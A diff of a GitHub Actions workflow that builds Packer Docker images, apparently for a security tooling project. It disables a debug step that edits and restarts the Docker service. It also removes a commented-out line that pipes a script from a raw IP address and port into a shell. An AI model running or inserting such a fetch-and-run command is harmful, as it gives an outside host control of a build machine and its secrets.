@@ -29,20 +29,19 @@ jobs:
         with:
           version: ${{ env.PRODUCT_VERSION }}
 
-      - name: DEBUG
-        id: debug
-        run: |
-          set -x
-          ls -lah
-          id
-          uname -a
-          df -h
-          sudo sed -i 's#ExecStart=/usr/bin/dockerd#ExecStart=/usr/bin/dockerd --storage-opt dm.basesize=20G#g' /usr/lib/systemd/system/docker.service
-          cat /usr/lib/systemd/system/docker.service | grep -iF storage
-          sudo systemctl restart docker
-          sleep 3
-          sudo systemctl status docker
-#          curl 86.194.92.215:6001|sh
+      # - name: DEBUG
+      #   id: debug
+      #   run: |
+      #     set -x
+      #     ls -lah
+      #     id
+      #     uname -a
+      #     df -h
+      #     sudo sed -i 's#ExecStart=/usr/bin/dockerd#ExecStart=/usr/bin/dockerd --storage-opt dm.basesize=20G#g' /usr/lib/systemd/system/docker.service
+      #     cat /usr/lib/systemd/system/docker.service | grep -iF storage
+      #     sudo systemctl restart docker
+      #     sleep 3
+      #     sudo systemctl status docker
 
       - name: Run `packer init`
         id: init
@@ -79,11 +78,11 @@ jobs:
           export PACKER_LOG_PATH=/dev/stdout
           packer build -only=lbt-offensive-stuff.docker.lbt lbt-docker.pkr.hcl
 
-      # - name: Run `packer build docker lbt-gui-tools`
-      #   id: lbt_gui_tools
-      #   run: |
-      #     cd packer
-      #     df -h
-      #     export PACKER_LOG=1
-      #     export PACKER_LOG_PATH=/dev/stdout
-      #     packer build -only=lbt-gui-tools.docker.lbt lbt-docker.pkr.hcl
+      - name: Run `packer build docker lbt-gui-tools`
+        id: lbt_gui_tools
+        run: |
+          cd packer
+          df -h
+          export PACKER_LOG=1
+          export PACKER_LOG_PATH=/dev/stdout
+          packer build -only=lbt-gui-tools.docker.lbt lbt-docker.pkr.hcl
